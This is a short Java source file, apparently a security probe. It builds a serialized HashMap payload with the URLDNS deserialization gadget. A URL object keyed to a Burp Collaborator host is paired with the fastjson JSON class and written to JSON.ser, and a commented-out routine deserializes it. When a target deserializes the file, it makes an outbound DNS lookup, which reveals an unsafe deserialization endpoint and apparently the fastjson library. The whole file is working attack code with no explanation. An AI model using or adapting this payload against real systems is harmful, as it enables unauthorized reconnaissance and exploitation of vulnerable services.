import java.io.*;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;

public class ScanClass {
    public static void main(String[] args) throws Exception{
        serial("JSON.ser");
//        unserial("JSON.ser");

    }

    public static void serial(String file) throws Exception{
        URLStreamHandler URLStreamHanderObj = new URLStreamHandler() {
            @Override
            protected URLConnection openConnection(URL u) throws IOException {
                return null;
            }

            @Override
            protected int hashCode(URL u) {
                return -1;
            }
        };
        URL url = new URL(null, "http://13.389d0aj777taqlvgkm944affq6wwkl.burpcollaborator.net", URLStreamHanderObj);

        HashMap hashMap = new HashMap();
        hashMap.put(url, com.alibaba.fastjson.JSON.class);

        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(file));
        objectOutputStream.writeObject(hashMap);
    }

    public static void unserial(String file) throws Exception{
        FileInputStream fileInputStream = new FileInputStream(file);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
    }
}
